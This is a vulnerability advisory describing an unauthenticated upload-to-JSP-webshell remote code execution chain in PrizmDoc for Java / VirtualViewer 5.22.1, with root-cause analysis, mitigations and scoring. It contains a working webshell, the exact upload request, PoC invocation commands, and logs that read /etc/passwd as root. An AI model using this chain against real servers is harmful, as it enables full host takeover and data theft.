# Accusoft / Apryse PrizmDoc for Java (VirtualViewer) 5.22.1 — Unauthenticated `uploadDocument` Arbitrary File Write to JSP Webshell to Root RCE

## 1. Overview

Accusoft / Apryse PrizmDoc for Java, shipped as the **VirtualViewer** application (the product descends from the Snowbound code line), is a commercial closed-source document-imaging / PDF document-viewer server from a US vendor. It runs as a Java web application on Apache Tomcat — in the build researched here, Tomcat 9.0.104 with OpenJDK 17.0.19 and `virtualviewer.war` deployed to `webapps/virtualviewer/` — and exposes its entire HTTP API through one servlet: `com.snowbound.ajax.servlet.AjaxServlet`, mapped at `/AjaxServlet`. Version tested: **5.22.1** (production build).

This advisory documents an **unauthenticated remote code execution chain** behind that single entrypoint. The `action=uploadDocument` request is handled without any authentication, and the default content handler (`FileContentHandler`) writes the uploaded bytes to a file named by the attacker-supplied `filename` parameter, inside `sample-documents/` — a directory in the web application root, hence reachable over HTTP. The only filename sanitization is a basename reduction that strips directory traversal; it places **no restriction on the extension**. Uploading a `.jsp` file therefore drops a compilable Java Server Page into the webapp, and Tomcat's global `*.jsp` servlet mapping compiles and executes it on request. In the verified deployment the JVM ran as uid 0, so the chain produced **root command execution**.

The research followed this path: (1) **surface discovery** — the obfuscated action-dispatch table was recovered by reflective enumeration of the action enum, whose `Enum.name()` values survived obfuscation, exposing all 28 action names including `uploadDocument`; (2) **authentication boundary analysis** — the web application descriptor was found to contain no authentication machinery at all; (3) **sink localization** — the file-write sink (`FileContentHandler.createDocument` / `saveDocumentContent` / `ClientServerIO.saveFileBytes`) and the code-execution sink (Tomcat's `*.jsp` mapping over the webapp); (4) **source identification and data-flow tracing** — from `g.c(request, "filename")` in the handler through `t.a(...)` and `ContentHandlerInput` into the write, recording exactly which validation exists and which does not; (5) **chain construction and dynamic verification** — three independent runs with fresh shell names plus an out-of-band host-side marker readback; (6) **reachability review and adversarial validation** — two independent passes that tried to refute the finding.

## 2. Vulnerability Summary

- **Type**: unauthenticated arbitrary file write (CWE-434, with CWE-22 only partially mitigated) chained into JSP code injection (CWE-94), made possible by a missing authentication layer for a critical function (CWE-306)
- **Entry point**: `POST /virtualviewer/AjaxServlet?action=uploadDocument&filename=<attacker-controlled>&clientInstanceId=<any>`, file bytes in a multipart part named `file`
- **Authentication required**: none — no cookie, no `Authorization` header, no credentials of any kind
- **Preconditions**: network reachability of the `AjaxServlet` endpoint; the tested deployment additionally had no license loaded (section 4)
- **Root cause**: `FileContentHandler.createDocument` derives the on-disk filename from the user-controlled `filename` value through a sanitizer (`FileContentHandler.a(String)`) that only removes path components, then writes the raw request bytes with `ClientServerIO.saveFileBytes` — no extension allow-list, no content-type validation, no separation between document storage and web-executable space
- **Write location and execution sink**: `context.getRealPath("./sample-documents")` — inside the deployed webapp root, web-reachable — under Tomcat's global `*.jsp` to `JspServlet` mapping (`conf/web.xml:448`), which covers the whole webapp including `sample-documents/`
- **Result**: unauthenticated JSP webshell execution with the JVM's privileges — uid=0 (root) in the verified deployment. CVSS **9.8 (Critical)**, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Affected**: PrizmDoc for Java / VirtualViewer 5.22.1 verified. Other versions were not tested and are not documented in the research record. The only public CVE the record documents for this product line is CVE-2018-15805 (XXE affecting versions before v13.5, since fixed)

## 3. Product & Architecture

### Attack Surface

| Element | Value as documented |
|---|---|
| Service | VirtualViewer (PrizmDoc for Java) document-viewer REST API server |
| Runtime / deployment | Apache Tomcat 9.0.104 + OpenJDK 17.0.19; `virtualviewer.war` in `webapps/virtualviewer/`, listener bound to `127.0.0.1:8090` on the research host |
| HTTP endpoints | `/virtualviewer/AjaxServlet` (the only servlet mapping in the webapp descriptor); `/virtualviewer/sample-documents/*` (the served document directory) |
| Protocol / action space | HTTP POST (`multipart/form-data` upload) and HTTP GET (webshell invocation); 28 actions dispatched by the `action` query parameter |
| Content handler | `com.snowbound.contenthandler.example.FileContentHandler` (web.xml init-param `contentHandlerClass`), reading and writing `./sample-documents` |

### Single-servlet design and action dispatch

All traffic is funnelled through `AjaxServlet.service()`. The `action` request parameter is parsed by `g.b(request)` into an enum (obfuscated name `h`) — `action=uploadDocument` resolves to the constant `h.w` — which is then used as a key into a `HashMap` of handler objects: the dispatch is `r.get(h2).a(request, response)`. Before dispatch, `service()` applies a license condition, `h2 != h.B && h2 != h.a && !LicenseManager.isLicenseLess() && !Product_IsLicensed(...)`, which throws "Not licensed" when it holds; section 4 shows why it never does on the tested build. Both rungs appear verbatim in the Data Flow block below.

The build is obfuscated — enum field names were rewritten to single letters (`a`-`z`, `A`, `B`) and handlers live in short-named classes such as `com.snowbound.ajax.servlet.a.ac` — but the original action names survived, because `Enum(String name, int ordinal)` retains them. Enumerating `h.values()` reflectively at runtime recovered all 28 names (`getLicense`, `emailDocument`, ... , `uploadDocument`, `health`), turning an opaque dispatch table into the attack-surface map for the rest of the research.

### The document root and the JSP mapping

The default content handler resolves its storage directory from the servlet context — `e = context.getRealPath("./sample-documents") + sep`, i.e. `webapps/virtualviewer/sample-documents/` — so the document store is part of the served web application rather than an out-of-band volume.

Tomcat's container-wide descriptor maps every `*.jsp` request in every webapp to the `JspServlet`:

```xml
<!-- Tomcat conf/web.xml:448 — container-wide mapping; schematic, the research record
     documents the mapping at this location and its *.jsp -> JspServlet effect -->
<servlet-mapping><url-pattern>*.jsp</url-pattern></servlet-mapping>
```

Any `.jsp` written under the webapp root — including inside `sample-documents/` — is compiled and executed when requested. That is the second sink of the chain and the reason a file write here equals code execution.

## 4. Authentication Boundary

The authentication claim here is narrow and evidence-backed: **the tested build ships the web application with no authentication machinery in its descriptor**. `WEB-INF/web.xml` contains exactly one servlet mapping and no security configuration — no `security-constraint`, no `filter-mapping`, no `login-config`:

```xml
<!-- webapps/virtualviewer/WEB-INF/web.xml — excerpt from the research record, comments rendered in English -->
<servlet>
  <servlet-name>AjaxServlet</servlet-name>
  <servlet-class>com.snowbound.ajax.servlet.AjaxServlet</servlet-class>
  <!-- init-params: contentHandlerClass=FileContentHandler, disableUploadDocument=false, ... -->
</servlet>
<servlet-mapping>
  <servlet-name>AjaxServlet</servlet-name>
  <url-pattern>/AjaxServlet</url-pattern>
</servlet-mapping>
<!-- no security-constraint, no filter-mapping, no login-config present -->
```

Three consequences follow from that configuration as shipped: `AjaxServlet` is the **only** HTTP entrypoint the application declares and it is mapped without any constraint, so the container is never asked to authenticate a request before dispatch; there is no authentication filter in the request path and no `login-config`, hence no container-managed realm, no form login and no session identity for the application to consult; consequently there are **no default credentials to speak of** — none are needed, because all 28 actions are reachable without a credential (CWE-306).

A second gate exists in code — the license check — and it was likewise non-blocking in the tested deployment. With no license loaded, `LicenseManager.isLicenseLess()` returns `true`, so `!isLicenseLess()` is `false` and the whole conjunction in `service()` evaluates to `false`: the "Not licensed" exception is never thrown and every action, `uploadDocument` included, dispatches normally. Two enum constants (`h.B`, `h.a`) are exempted from the license requirement outright. The servlet init-param `disableUploadDocument` is `false` in this build, i.e. the upload action is enabled.

**Scope of these statements.** All of the above describes *the build and deployment that were tested* — a stock `virtualviewer.war` for 5.22.1 deployed to Tomcat with no license loaded. This advisory does **not** assert how every customer deployment is configured: an operator can place an authenticating reverse proxy, a network restriction or a custom filter in front of the application, and those controls live outside the webapp descriptor and outside this research. What is documented is that the application itself, as shipped in the tested build, carries no authentication layer and no license barrier in the no-license state, so any such protection must come from the surrounding deployment. Whether `uploadDocument` remains reachable when a valid license *is* loaded is not documented in the research record.

## 5. Root-Cause Analysis

### Sink Identification

The first sink is the file write in the default content handler — a raw byte dump to a path built by concatenating the document root with the sanitized document id, with no extension allow-list, no MIME validation and no check that the target lies outside web-executable space:

```java
// FileContentHandler.java:380-394 — createDocument
public ContentHandlerResult createDocument(ContentHandlerInput input) throws Exception {
    String string = this.a(input.getDocumentId());   // basename sanitizer (see below)
    File file;
    if ((file = new File(e + string)).exists()) {     // e = <webapp>/sample-documents/
        throw new ContentHandlerException("A document by this name already exists");
    }
    return this.saveDocumentContent(input);           // performs the write
}

// FileContentHandler.java:419-432 — saveDocumentContent -> a(...) -> ClientServerIO.saveFileBytes
//   ClientServerIO.saveFileBytes(byArray, new File(e + string2));   // no extension check
```

The duplicate-name guard is the only refusal condition, which is why the proof of concept uses a fresh filename on every run. The second sink is the JSP compiler mapping of section 3 (`*.jsp` to `JspServlet`, `conf/web.xml:448`); writing inside the webapp root places attacker bytes where that mapping applies.

### Source Identification

The attacker-controlled input enters in the `uploadDocument` handler (`ac.b()` in `com.snowbound.ajax.servlet.a.ac`):

```java
// ac.java b() — uploadDocument handler (decompiled excerpt)
String filename = g.c(request, "filename");               // user-controlled source
byte[] bytes = ...;                                       // multipart part named "file"
this.f.a(request, response, clientId, filename, bytes);   // -> t.a(...) -> createDocument

// t.java:849 — a(Object, Object, String, String, byte[])
ContentHandlerInput chi = new ContentHandlerInput(string2, string, object); // string2 = filename -> documentId
chi.setDocumentContent(byArray2);
return e2.n(chi);                                         // -> FileContentHandler.createDocument
```

`g.c(request, "filename")` reads the query string first and the multipart body second — which is why the exploit places `filename` in the URL. The value flows unmodified into `ContentHandlerInput` as the `documentId`, and `documentId` becomes the on-disk filename. **Sanitization status**: the value passes through exactly one transformation, the basename sanitizer. No character whitelist, no extension blacklist, no canonicalization against a document-id namespace, no magic-byte or content-type check.

### The sanitizer that only defends against traversal

```java
// FileContentHandler.java:1012-1030 — a(String)
public String a(String string) {
    return Paths.get(string).getFileName().toString();   // "../../etc/x" -> "x";  "shell.jsp" -> "shell.jsp"
}
```

`Paths.get(...).getFileName()` reduces the input to its last path element. That does defeat `../../` escapes out of the document root (CWE-22 partially mitigated), but the control says nothing about *what the file is*: a bare, legal filename such as `shell.jsp` passes through byte for byte. The defense is aimed at the wrong half of the problem — it constrains *where* a file may be written, not *whether the written file is executable*. Combined with a document root inside the webapp, that is the whole vulnerability.

### Data Flow

```
HTTP POST /virtualviewer/AjaxServlet?action=uploadDocument&filename=shell.jsp
  (no Cookie, no Authorization header)
  +-- AjaxServlet.service(request, response)                  [no authentication gate]
       +-- h2 = g.b(request)             action="uploadDocument" -> enum h.w
       +-- license check: h2 != h.B && h2 != h.a && !isLicenseLess() && !Product_IsLicensed(...)
       |     +-- isLicenseLess()=true -> conjunction false -> no exception [license gate short-circuited]
       +-- r.get(h2).a(request, response)  HashMap dispatch to handler ac -> ac.b()
            +-- filename = g.c(request, "filename") = "shell.jsp"              [source]
            +-- bytes    = multipart part "file" = JSP webshell source
            +-- this.f.a(request, response, clientId, "shell.jsp", bytes)
                 +-- t.a(...) -> ContentHandlerInput("shell.jsp", ...).setDocumentContent(bytes)
                      +-- e2.n(input) -> FileContentHandler.createDocument
                           +-- string = this.a("shell.jsp") = "shell.jsp" [basename sanitizer: no extension control]
                           +-- new File(e + "shell.jsp")                  [e = <webapp>/sample-documents/]
                           +-- ClientServerIO.saveFileBytes(bytes, file)  [file-write sink]

HTTP GET /virtualviewer/sample-documents/shell.jsp?cmd=id
  +-- Tomcat JspServlet compiles and executes shell.jsp          [code-execution sink]
       +-- Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"})
            +-- uid=0(root) -> written to the HTTP response body
```

## 6. Exploit Chain Construction

**Step 1 — build the payload.** A minimal command-execution JSP that reads a `cmd` parameter, runs it through `/bin/sh -c`, and echoes stdout into the response:

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
    br.close();
}
%>
```

**Step 2 — upload it without credentials.** `filename` must appear in the query string (what `g.c()` reads first), the bytes go in the multipart part named `file`, and a per-run unique name (`shell_<8 hex>.jsp`) avoids the duplicate-name refusal:

```
POST /virtualviewer/AjaxServlet?action=uploadDocument&filename=shell.jsp&clientInstanceId=rcetest HTTP/1.1
Content-Type: multipart/form-data; boundary=----vv<uuid>

------vv<uuid>
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<JSP webshell source>
------vv<uuid>--
```

A successful write answers `HTTP 200` with a JSON body of the form `{"documentIdToReload":"shell_<8 hex>.jsp","status":"OK"}` — no 401, no 403, no redirect to a login page.

**Step 3 — invoke it.** The document directory is web-reachable, so `GET /virtualviewer/sample-documents/shell.jsp?cmd=id` causes Tomcat to compile and run the dropped page; the response is `HTTP 200`, `Content-Type: text/html`, with the command output in the body. Two unauthenticated HTTP requests, no session, no prerequisite beyond reachability — the write and the execution cross the same (absent) trust boundary.

## 7. PoC Usage

A self-contained, standard-library-only Python 3 proof of concept ships with this advisory at `exploit/prizmdoc_unauth_uploaddocument_webshell_rce.py`. It performs the upload and the invocation, generates a unique shell name per run, and prints both HTTP statuses plus the command output:

```bash
python3 exploit/prizmdoc_unauth_uploaddocument_webshell_rce.py --target http://127.0.0.1:8090 --cmd id
python3 exploit/prizmdoc_unauth_uploaddocument_webshell_rce.py --target http://127.0.0.1:8090 --cmd "whoami; hostname"
```

Defaults: `--target http://127.0.0.1:8090`, `--cmd id`, `--app virtualviewer`, timeout 30 s. No third-party dependencies (only `argparse`, `sys`, `urllib.request`, `urllib.parse`, `uuid`). The PoC is for authorized security testing and coordinated disclosure only — never run it against systems you are not explicitly authorized to test.

## 8. Verification Evidence

### Environment

- Target `127.0.0.1:8090` (loopback on the research host); Tomcat 9.0.104 + OpenJDK 17.0.19 with `virtualviewer.war` in `webapps/virtualviewer/`; VirtualViewer 5.22.1 production build, license not loaded (`isLicenseLess()` returns `true`)
- The standard-library PoC was run against the loopback listener from the research host over SSH

### Run 1 — `id`

```
[*] Target: http://127.0.0.1:8090
[*] Uploading JSP webshell 'shell_58250d66.jsp' via unauth uploadDocument...
[+] Upload HTTP 200: {"documentIdToReload":"shell_58250d66.jsp","status":"OK"}
[*] Executing cmd via shell_58250d66.jsp: id
[+] Execution HTTP 200:

uid=0(root) gid=0(root) ?=0(root)
```

### Run 2 — identity, host, and password-file first line

```
[*] Target: http://127.0.0.1:8090
[*] Uploading JSP webshell 'shell_b44a6fbc.jsp' via unauth uploadDocument...
[+] Upload HTTP 200: {"documentIdToReload":"shell_b44a6fbc.jsp","status":"OK"}
[*] Executing cmd via shell_b44a6fbc.jsp: whoami; hostname; head -1 /etc/passwd
[+] Execution HTTP 200:

root
<hostname>
root:x:0:0:root:/root:/bin/bash
```

### Run 3 — fresh random marker with out-of-band readback

To exclude the possibility of reading a stale artifact, the third run generated a fresh random marker, wrote it to a new file through the webshell, and read that file back over an independent channel (SSH to the host):

```
[*] Target: http://127.0.0.1:8090
[*] Uploading JSP webshell 'shell_67e82801.jsp' via unauth uploadDocument...
[+] Upload HTTP 200: {"documentIdToReload":"shell_67e82801.jsp","status":"OK"}
[*] Executing cmd via shell_67e82801.jsp: echo RCE_PROOF_178c549379e249e68bcc6629615a2bad > /tmp/vv_final_proof.txt; id >> /tmp/vv_final_proof.txt
[+] Execution HTTP 200:

MARK=178c549379e249e68bcc6629615a2bad
=== SSH readback ===
RCE_PROOF_178c549379e249e68bcc6629615a2bad
uid=0(root) gid=0(root) <group field rendered in the host's locale>
-rw-r----- 1 root root 79 <timestamp> /tmp/vv_final_proof.txt
```

The marker value in the HTTP-triggered command and the value read back from the host filesystem are identical, and the file is owned by `root` (`-rw-r----- 1 root root`, 79 bytes). Two independent observation channels — the HTTP response echo and the host filesystem — agree on the same freshly generated value, with the writing identity confirmed as uid=0. Across the three runs, upload responses were consistently `HTTP 200` with `status":"OK"` and execution responses consistently `HTTP 200` `text/html` carrying the command results; no run produced a 401, 403 or login redirect.

### Adversarial verification

Two independent passes were run against the finding before it was accepted. **Falsification pass — NOT_REFUTED, confidence 0.98**: seven refutation directions were attempted (is authentication really absent, is the license gate really bypassed, is there an extension blacklist, is the write location really web-reachable, does JSP execution really happen there, is the privilege really root, is any other defense present along the path); every refutation attempt failed and an independent dynamic execution again returned uid=0. **Independent re-analysis pass — CONFIRMED, confidence 0.98**: a second analysis from scratch, without reference to the first one's conclusions, independently enumerated the 28 actions, independently found that `uploadDocument` writes into `sample-documents/` inside the webapp, independently constructed the multipart upload, and independently reproduced the result with a fresh marker (uid=0 plus SSH readback). Both gates passed, so the finding is recorded as a confirmed unauthenticated root RCE.

## 9. Security Impact

### Reachability

Each hop was checked for reachability rather than assumed: **authentication reachability** — `AjaxServlet` has no authentication gate, so `uploadDocument` is callable without credentials (CWE-306); **license reachability** — with no license loaded `isLicenseLess()` returns `true` and the license condition short-circuits, so the action dispatches instead of throwing; **write reachability** — the `disableUploadDocument` init-param is `false`, so the upload handler is enabled; **execution reachability** — `sample-documents/` sits in the webapp root and is web-reachable under Tomcat's global `*.jsp` mapping. There is also **no man-in-the-middle prerequisite** (the chain is a plain unauthenticated POST followed by a GET, with no traffic interception or hijacking) and **no dependence on an installation window** (the service was running normally, not in a first-boot or setup-wizard state).

### Blast radius

What was verified: an unauthenticated network attacker obtained arbitrary command execution as uid=0 on the host running the document server, in the tested deployment. From that position everything the host can reach is in scope — and for a document-viewer server the position is unusually valuable. Privilege-level caveat: the uid=0 result is a property of the deployment tested (the JVM ran as root there); the code-execution primitive itself — unauthenticated webshell write plus execution — holds under any service account, and that account's privileges then set the blast radius.

- **Hosted documents.** The document store served by `FileContentHandler` (`./sample-documents`) is readable and writable by the process: whatever the viewer has been asked to render, convert or cache is exposed, and documents can be altered or destroyed. Because the same directory is web-reachable, an attacker can also plant content that other users' sessions will fetch, or drop further webshells for persistence.
- **The service and its configuration.** Root on the host exposes the servlet container configuration, certificates and keystore material, database or backend connection strings, and the application init-params — including license state and the configured content-handler class. It also allows an attacker to disable or rewrite the very controls a defender would rely on.
- **Integrations and lateral movement.** A server-side document viewer is a backend called by other applications and typically sits in the same trust zone as the systems that embed it, with outbound reach toward document sources and internal repositories; the recovered action list includes document-handling actions such as `emailDocument`, i.e. the service has egress paths of its own. Root access on such a host converts a document-viewing service into a pivot point. The concrete integration topology of any given customer was not part of this research — the pivot potential follows from the verified root-level code execution, not from an observed customer integration.

## 10. Mitigation

Vendor-side fixes, ordered by how directly they address the root cause:
1. **Put an authentication layer in front of `AjaxServlet`** — declare a `security-constraint` plus `login-config` covering `/AjaxServlet`, or register an authentication filter, so no action is dispatched for an unauthenticated caller.
2. **Make the license gate fail closed** — when `isLicenseLess()` returns `true`, refuse all actions except the minimal health / license-query set instead of short-circuiting the check and allowing everything; the present logic is fail-open in the unlicensed state.
3. **Validate the upload extension against an allow-list** — `FileContentHandler.createDocument` should accept only document types (for example `.pdf`, `.tif`, `.docx`) and reject anything the container can execute or deploy (`.jsp`, `.jspx`, `.war` and similar). A deny-list is insufficient: the set of executable extensions is not closed.
4. **Separate the document store from web-executable space** — write uploads outside the web application root, to a directory the container neither serves nor compiles (for example `/var/lib/virtualviewer/docs/`), instead of `sample-documents/` inside the webapp.
5. **Narrow the JSP mapping** — exclude upload directories from the container's `*.jsp` mapping, or configure a `jsp-property-group` that disables scripting for any path where user-supplied files can land.

Operator-side measures pending a vendor fix: **do not expose `AjaxServlet` to untrusted networks** (front it with an authenticating reverse proxy or restrict it to trusted networks, since the application as tested authenticates nothing); **run the JVM under a dedicated low-privilege account**, never as root, so a successful chain does not immediately hand over host ownership; **disable document upload where it is unused** (`disableUploadDocument` ships as `false` in the tested build — evaluate setting it after confirming the effect with the vendor); and **detect the artifact** (alert on new `.jsp` files under the webapp's `sample-documents/` directory and on `uploadDocument` requests whose `filename` carries a server-executable extension).

## 11. CWE & CVSS

- **CWE-306** — Missing Authentication for Critical Function: the descriptor declares no `security-constraint`, no `filter-mapping`, no `login-config`; all 28 actions are reachable anonymously.
- **CWE-434** — Unrestricted Upload of File with Dangerous Type: `uploadDocument` writes attacker bytes under an attacker-chosen name with no extension or content-type validation, into a web-executable directory.
- **CWE-94** — Improper Control of Generation of Code (Code Injection): the written `.jsp` file is compiled and executed by Tomcat's global JSP mapping, yielding arbitrary Java and OS command execution.
- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory: partially mitigated only; `Paths.get(...).getFileName()` strips directory traversal but says nothing about the executable nature of the file.

**CVSS 3.1 base score: 9.8 (Critical)** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`: network attack vector, low attack complexity, no privileges required, no user interaction, unchanged scope, high impact on confidentiality, integrity and availability.

---
*This advisory will be published at https://0day-rubbish.com/blog/accusoft-prizmdoc-unauth-uploaddocument-jsp-webshell-rce as part of batch-11. Disclosure status is tracked in DISCLOSURE-STATUS.md. Contact: disclosure@0day-rubbish.com.*
